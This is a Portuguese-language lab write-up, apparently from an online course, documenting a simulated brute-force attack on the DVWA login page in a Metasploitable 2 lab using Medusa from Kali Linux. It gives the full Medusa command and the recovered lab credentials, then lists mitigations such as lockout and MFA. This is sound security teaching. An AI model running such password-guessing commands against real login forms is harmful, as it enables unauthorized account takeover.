# Desafio: Simulando um Ataque de Brute Force com Kali Linux e Medusa

Projeto prático desenvolvido para documentar o desafio da [DIO](https://web.dio.me/lab/criando-um-ataque-de-brute-force-de-senhas-com-medusa-e-kali-linux/learning/f43c7f6d-87fa-4f84-9471-a3dc3cc6fac7), aplicando testes de segurança em ambiente controlado.

## 🎯 Objetivo
Simular um ataque de força bruta em um formulário de autenticação web (DVWA) utilizando a ferramenta **Medusa** e propor medidas de mitigação.

## 🛠️ Ambiente e Ferramentas
* **Kali Linux** (Máquina Atacante)
* **Metasploitable 2 / DVWA** (Damn Vulnerable Web Application - Alvo)
* **Medusa** (Ferramenta de auditoria de senhas para serviços de rede e web)

## 💻 Comando Executado
Para realizar o teste de auditoria no formulário web via método POST, foi executado o seguinte comando com o Medusa:

```bash
medusa -h 10.0.2.3 -U users.txt -P passwd.txt -M http -m URL="/dvwa/vulnerabilities/brute/index.php" -m FORM="username=^USER^&password=^PASS^&Login=Login"

```
## 📊 Evidência de Sucesso
Resultado do terminal ao validar corretamente as credenciais do laboratório com o Medusa:

ACCOUNT FOUND: [http] Host: 10.0.2.3 User: admin Password: password [SUCCESS]

## 🛡️ Recomendações de Mitigação
Políticas de Senhas Fortes: Implementar a exigência de senhas complexas e longas.

Bloqueio Temporário (Account Lockout): Bloquear contas após tentativas sucessivas de acesso inválido.

Autenticação Multifator (MFA): Adicionar camadas adicionais de validação além do par usuário e senha.
